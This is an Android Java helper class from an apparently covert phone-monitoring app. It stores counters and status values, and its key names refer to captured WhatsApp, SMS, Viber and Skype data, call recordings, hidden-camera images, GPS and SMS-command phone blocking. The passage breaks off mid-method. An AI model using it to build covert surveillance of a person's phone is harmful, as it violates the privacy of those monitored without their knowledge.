/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
/**
 * @author jitendrav
 *
 */
package com.hinj.app.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

public class SpyCallSharedPrefrence {
	
	final static String SPY_CALL_SHARED_PREFERENCE="SPY_CALL_SHARED_PREFERENCE";
	final static String SP_WHATSUP_PRE_COUNT="SP_WHATSUP_PRE_COUNT";
	final static String SP_WHATSAPP_IMAGE_PRE_COUNT="SP_WHATSAPP_IMAGE_PRE_COUNT";
	final static String SP_WHATSAPP_VOICE_PRE_COUNT="SP_WHATSAPP_VOICE_PRE_COUNT";
	
	final static String SP_SMS_PRE_COUNT="SP_SMS_PRE_COUNT";
	final static String SP_BROWSER_PRE_COUNT="SP_BROWSER_PRE_COUNT";
	final static String SP_CALL_PRE_COUNT="SP_CALL_PRE_COUNT";	
	final static String SP_EMAIL_PRE_COUNT="SP_EMAIL_PRE_COUNT";
	final static String SP_LICENCE_KEY="SP_LICENCE_KEY";
	final static String SP_MOBILE_NO="SP_MOBILE_NO";
	final static String SP_FACEBOOK_PRE_COUNT="SP_FACEBOOK_PRE_COUNT";
	final static String SP_SKYPE_PRE_COUNT="SP_SKYPE_PRE_COUNT";
	final static String IMAGE_COUNT="IMAGE_COUNT";
	final static String HIDE_CAM_FILENAME="HIDE_CAM_FILENAME";
	final static String SP_HIDE_CAMERA_PRE_COUNT="SP_HIDE_CAMERA_PRE_COUNT";
	
	final static String SP_CONTACT_IMAGE_COUNT="SP_CALL_LIST_COUNT";
	private static final  String SP_IMAGE_PRE_COUNT="SP_IMAGE_PRE_COUNT";
	private static final  String SP_VIDEO_PRE_COUNT="SP_VIDEO_PRE_COUNT";
	private static final  String SP_MUSIC_PRE_COUNT="SP_MUSIC_PRE_COUNT";
	
	
	private static final  String DEVICE_BATTERY_INFO="DEVICE_BATTERY_INFO";	
	private static final  String CALL_RECORD_COUNT="CALL_RECORD_COUNT";
	private static final  String CALL_RECORD_STATUS="CALL_RECORD_STATUS";
	private static final  String CALL_RECORD_FILENAME="CALL_RECORD_FILENAME";
	private static final  String CALL_RECORD_NUMBER="CALL_RECORD_NUMBER";
	private static final  String DEVICE_PRE_ID="DEVICE_PRE_ID";
	private static final  String ONE_TIME_GPS="ONE_TIME_GPS";	
	private static final  String INSTAGRAM_COMMENT_DATE="INSTAGRAM_COMMENT_DATE";
	private static final  String INSTAGRAM_SECONDSTATUS="INSTAGRAM_SECONDSTATUS";
	
	private static final  String SP_VIBER_CHAT_PRE_COUNT="SP_VIBER_CHAT_PRE_COUNT";
	private static final  String SP_VIBER_IMAGE_PRE_COUNT="SP_VIBER_IMAGE_PRE_COUNT";
	private static final  String SP_BBM_CHAT_PRE_COUNT="SP_BBM_CHAT_PRE_COUNT";
	private static final  String SP_BBM_IMAGE_PRE_COUNT="SP_BBM_IMAGE_PRE_COUNT";
	private static final  String SP_BBM_VOICE_PRE_COUNT="SP_BBM_VOICE_PRE_COUNT";
	
	private static final  String SP_CALENDER_PRE_COUNT="SP_CALENDER_PRE_COUNT";
	private static final  String SP_INSTALL_APP_PRE_COUNT="SP_INSTALL_APP_PRE_COUNT";
	private static final  String SP_INSTALL_APP_APK_PRE_COUNT="SP_INSTALL_APP_APK_PRE_COUNT";
	private static final  String SP_LINE_CHAT_PRE_COUNT="SP_LINE_CHAT_PRE_COUNT";
	private static final  String SP_LINE_IMAGE_PRE_COUNT="SP_LINE_IMAGE_PRE_COUNT";
	private static final  String SP_LINE_CHAT_VOICE_COUNT="SP_LINE_CHAT_VOICE_COUNT";
	public static final String LOGGING_STATUS="LOGGING_STATUS";	
	
	public static final String APP_UPLOAD="APP_UPLOAD";	
	
	private static final  String SP_APK_NAME="SP_APK_NAME";
	private static final  String SP_APK_NUMBER="SP_APK_NUMBER";
	
	/******************************WeChat*************/
	final static String SP_COUNT_GROUP_ID="SP_COUNT_GROUP_ID";
	final static String SP_COUNT_VOICEGROUP_ID="SP_COUNT_VOICEGROUP_ID";
	final static String SP_DB_PATH="SP_DB_PATH";
	private static final boolean OPT_FKON_DEF = false;
	private static final String OPT_FKON = "EnableForeignKeys";
	private static final String OPT_FILENO = "RecentFiles";
	private static final String OPT_FILENO_DEF = "5";
	
	final static String SP_TWITTER_PRE_COUNT="SP_TWITTER_PRE_COUNT";
	
	private static final  String SP_SUBMIT_CLICK="SP_SUBMIT_CLICK";
	
	/*final static String SP_LISTEN_SURROUNDING_NUMBER_1="SP_LISTEN_SURROUNDING_NUMBER_1";
	final static String SP_LISTEN_SURROUNDING_NUMBER_2="SP_LISTEN_SURROUNDING_NUMBER_2";
	final static String SP_LISTEN_SURROUNDING_NUMBER_3="SP_LISTEN_SURROUNDING_NUMBER_3";
	final static String SP_LISTEN_SURROUNDING_NUMBER_4="SP_LISTEN_SURROUNDING_NUMBER_4";
	final static String SP_LISTEN_SURROUNDING_NUMBER_5="SP_LISTEN_SURROUNDING_NUMBER_5";
	*/
	


	private static final  String SMS_COMMAND_PHONE_BLOCKED_STATUS="SMS_COMMAND_PHONE_BLOCKED_STATUS";
	
	// retain status after submit click
	/**************************/
	public static void saveSubmitStatus(Context context,String Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_SUBMIT_CLICK, Precount).commit();
	}

	public static String getSubmitStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_SUBMIT_CLICK,"");
	}
	
	public static String getSpSubmitClick() {
		return SP_SUBMIT_CLICK;
	}
	private static final  String SP_NUMBER="SP_NUMBER";
	
	final static String SP_USER_ID="SP_USER_ID";
	
	final static String SP_DEVICE_DOWNAPP="SP_DEVICE_DOWNAPP";
	
	/**************************/
	public static final String TIME_RESTRICTION_PHONE_BLOCKED_STATUS="TIME_RESTRICTION_PHONE_BLOCKED_STATUS";
	
	public static void saveWhatsUp_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_WHATSUP_PRE_COUNT, Precount).commit();
	}

	public static int getsaveWhatsUp_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		 return sp.getInt(SP_WHATSUP_PRE_COUNT,0);
	}
	
	/**************************/
	public static void saveSMS_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_SMS_PRE_COUNT, Precount).commit();
	}

	public static int getsaveSMS_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_SMS_PRE_COUNT,0);
	}
	/**************************/
	public static void saveBROWSER_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_BROWSER_PRE_COUNT, Precount).commit();
	}

	public static int getsaveBROWSER_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_BROWSER_PRE_COUNT,0);
	}
	
	/**************************/
	public static void saveCALL_PreCount(Context context,long Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putLong(SP_CALL_PRE_COUNT, Precount).commit();
	}

	public static long getsaveCALL_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getLong(SP_CALL_PRE_COUNT,0);
	}
	
	/**************************/
	public static void saveEMAIL_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_EMAIL_PRE_COUNT, Precount).commit();
	}

	public static int getsaveEMAIL_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_EMAIL_PRE_COUNT,0);
	}
	/**************************/
	public static void saveLICENCE_KEY(Context context,String LicenceKey)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_LICENCE_KEY, LicenceKey).commit();
	}

	public static String getsaveLICENCE_KEY(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_LICENCE_KEY,"");
	}
	
	/**************************/
	public static void saveChildKey(Context context,String Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_USER_ID, Precount).commit();
	}

	public static String getChildKey(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_USER_ID,"");
	}

	/**************************/
	public static void saveUSER_ID(Context context,String UserID)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_USER_ID, UserID).commit();
	}

	public static String getsaveUSER_ID(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_USER_ID,"");
	}
	
	/**************************/
	/**************************/
	public static void saveMOBILE_NO(Context context,String MobileNo)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_MOBILE_NO, MobileNo).commit();
	}

	public static String getsaveMOBILE_NO(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_MOBILE_NO,"");
	}
	
	/**************************/
	
	public static void saveDEVICE_DOWNAPP(Context context,Boolean StatusApp)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putBoolean(SP_DEVICE_DOWNAPP, StatusApp).commit();
	}
 
	public static Boolean getsaveDEVICE_DOWNAPP(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getBoolean(SP_DEVICE_DOWNAPP,false);
	}
	/**************************/
	public static void saveCONTACT_LISTCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_CONTACT_IMAGE_COUNT, Precount).commit();
	}

	public static int getsaveCONTACT_LISTCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_CONTACT_IMAGE_COUNT,0);
	}
	
	/**************************/
	
	/**************************/
	public static void saveCONTACT_Image_Count(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_CONTACT_IMAGE_COUNT, Precount).commit();
	}

	public static int getsaveCONTACT_Image_Count(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_CONTACT_IMAGE_COUNT,0);
	}
	
	/**************************/
	
	public static void saveWHATSAPP_IMAGE_COUNT(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_WHATSAPP_IMAGE_PRE_COUNT, Precount).commit();
	}

	public static int getWHATSAPP_IMAGE_COUNT(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_WHATSAPP_IMAGE_PRE_COUNT,0);
	}
	/**************************/
	public static void saveWHATSAPP_VOICE_COUNT(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_WHATSAPP_VOICE_PRE_COUNT, Precount).commit();
	}

	public static int getWHATSAPP_VOICE_COUNT(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_WHATSAPP_VOICE_PRE_COUNT,0);
	}
	/****************************/
	public static void saveIMAGES_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_IMAGE_PRE_COUNT, Precount).commit();
	}

	public static int getsaveIMAGES_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_IMAGE_PRE_COUNT,0);
	}
	/**************************/
	/****************************/
	public static void saveMUSIC_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_MUSIC_PRE_COUNT, Precount).commit();
	}

	public static int getsaveMUSIC_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_MUSIC_PRE_COUNT,0);
	}
	/**************************/
	public static void saveVIDEO_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_VIDEO_PRE_COUNT, Precount).commit();
	}

	public static int getsaveVIDEO_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_VIDEO_PRE_COUNT,0);
	}

	
	public static void saveNumberLoggingStatus(Context context,String numberLoggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_NUMBER, numberLoggingStatus).commit();
	}

	public static String getNumberLoggingStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_NUMBER,"");
	}
	

	public static void saveDeviceBatteryInfo(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(DEVICE_BATTERY_INFO, loggingStatus).commit();
	}

	public static String getDeviceBatteryInfo(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(DEVICE_BATTERY_INFO,"");
	}
	
	
	public static void saveCallRecordCount(Context context,int loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(CALL_RECORD_COUNT, loggingStatus).commit();
	}

	public static int getCallRecordCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(CALL_RECORD_COUNT,0);
	}
	
	/***********TWITTER***************/
	public static void saveTwitter_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_TWITTER_PRE_COUNT, Precount).commit();
	}

	public static int getSaveTwitter_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_TWITTER_PRE_COUNT,0);
	}


	public static void saveCallRecordStatus(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(CALL_RECORD_STATUS, loggingStatus).commit();
	}

	public static String getCallRecordStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(CALL_RECORD_STATUS,"0");
	}
	
	public static void saveCallRecordFileName(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(CALL_RECORD_FILENAME, loggingStatus).commit();
	}

	public static String getCallRecordFileName(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(CALL_RECORD_FILENAME,"");
	}
	
	public static void saveCallRecordMobileNumber(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(CALL_RECORD_NUMBER, loggingStatus).commit();
	}

	/////////////////////////////////////////////////////////////
	public static void saveSMSCommandPhoneBlockedStatus(Context context,int phoneBlockStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SMS_COMMAND_PHONE_BLOCKED_STATUS,phoneBlockStatus).commit();
	}

	public static int getSMSCommandPhoneBlockedStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SMS_COMMAND_PHONE_BLOCKED_STATUS,0);
	}
	/////////////////////////////////////////////////////////////////
	
	
	public static String getCallRecordMobileNumber(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(CALL_RECORD_NUMBER,"");
	}
	/**************************/
	public static void saveDEVICEID_Pre(Context context,String DecvieID)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(DEVICE_PRE_ID, DecvieID).commit();
	}

	public static String getsaveDEVICEID_Pre(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(DEVICE_PRE_ID,"");
	}

	/**************************/
	/****************Facebook**********/
	public static void saveFacebook_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_FACEBOOK_PRE_COUNT, Precount).commit();
	}

	public static int getsaveFacebook_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_FACEBOOK_PRE_COUNT,0);
	}

	/****************Skpe**********/
	public static void saveSkype_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_SKYPE_PRE_COUNT, Precount).commit();
	}

	public static int getsaveSkype_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_SKYPE_PRE_COUNT,0);
	}
	/**********************HideCamera********/
	public static void saveHideCameraImageCount(Context context,int status)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(IMAGE_COUNT, status).commit();
	}

	public static int getHideCameraImageCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(IMAGE_COUNT,0);
	}
	public static void saveHideCameraImage_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_HIDE_CAMERA_PRE_COUNT, Precount).commit();
	}

	public static int getsaveHideCameraImage_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_HIDE_CAMERA_PRE_COUNT,0);
	}
	
	public static void saveHideCamFileName(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(HIDE_CAM_FILENAME, loggingStatus).commit();
	}

	public static String getHideCamFileName(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(HIDE_CAM_FILENAME,"");
	}
	//*********************
	
	public static void saveOneTimeGPS(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(ONE_TIME_GPS, loggingStatus).commit();
	}

	public static String getOneTimeGPS(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(ONE_TIME_GPS,"true");
	}
	//*********************
	
	public static void saveInstagramCommentDate(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(INSTAGRAM_COMMENT_DATE, loggingStatus).commit();
	}

	public static String getInstagramCommentDate(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(INSTAGRAM_COMMENT_DATE,"0");
	}

	public static void saveInstagramSecondTimeStatus(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(INSTAGRAM_SECONDSTATUS, loggingStatus).commit();
	}

	public static String getInstagramSecondTimeStatus(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(INSTAGRAM_SECONDSTATUS,"false");
	}
	/************Viber Chat**************/
	public static void saveViberChat_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_VIBER_CHAT_PRE_COUNT, Precount).commit();
	}
	
	public static int getViberChat_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_VIBER_CHAT_PRE_COUNT,0);
	}

	public static void saveViberChatImage_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_VIBER_IMAGE_PRE_COUNT, Precount).commit();
	}

	public static int getViberChatImage_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_VIBER_IMAGE_PRE_COUNT,0);
	}
	/************Viber Chat**************/
	/************BBM Chat****************/
	public static void saveBBMChat_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_BBM_CHAT_PRE_COUNT, Precount).commit();
	}	
	public static int getBBMChat_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_BBM_CHAT_PRE_COUNT,0);
	}
	public static void saveBBMChatImage_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_BBM_IMAGE_PRE_COUNT, Precount).commit();
	}

	public static int getBBMChatImage_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_BBM_IMAGE_PRE_COUNT,0);
	}
	public static void saveBBMChatVoice_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_BBM_VOICE_PRE_COUNT, Precount).commit();
	}

	public static int getBBMChatVoice_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_BBM_VOICE_PRE_COUNT,0);
	}
	/**************************/
	public static void saveCalender_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_CALENDER_PRE_COUNT, Precount).commit();
	}

	public static int getsaveCalender_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_CALENDER_PRE_COUNT,0);
	}
	/**************************/
	public static void saveINSTALL_APP_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_INSTALL_APP_PRE_COUNT, Precount).commit();
	}

	public static int getsaveINSTALL_APP_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_INSTALL_APP_PRE_COUNT,0);
	}	
	
	
	/**************************/
	public static void saveINSTALL_APP_APK_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_INSTALL_APP_APK_PRE_COUNT, Precount).commit();
	}

	public static int getsaveINSTALL_APP__APK_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_INSTALL_APP_APK_PRE_COUNT,0);
	}	
	/**************************/
	
	/**************************/
	public static void saveINSTALL_APP_Icon_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_INSTALL_APP_APK_PRE_COUNT, Precount).commit();
	}

	public static int getsaveINSTALL_APP__Icon_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_INSTALL_APP_APK_PRE_COUNT,0);
	}	
	/**************************/
	
	
	public static void saveLineChat_PreCount(Context context,int Precount)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_LINE_CHAT_PRE_COUNT, Precount).commit();
	}

	public static int getsaveLineChat_PreCount(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getInt(SP_LINE_CHAT_PRE_COUNT,0);
	}
	
	public static void setApkName(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_APK_NAME, loggingStatus).commit();
	}

	public static String getApkName(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_APK_NAME,"0");
	}
	
	public static void setIconApkName(Context context,String loggingStatus)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putString(SP_APK_NAME, loggingStatus).commit();
	}

	public static String getIconApkName(Context context)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		return sp.getString(SP_APK_NAME,"0");
	}
	
	public static void setApkIndexNumber(Context context,int apk_index_number)
	{
		SharedPreferences sp=context.getSharedPreferences(SPY_CALL_SHARED_PREFERENCE,Activity.MODE_PRIVATE);
		sp.edit().putInt(SP_APK_NUMBER, apk_index_number).commit();
	}

	public static int getApkIndexNumber(Context context)
	{
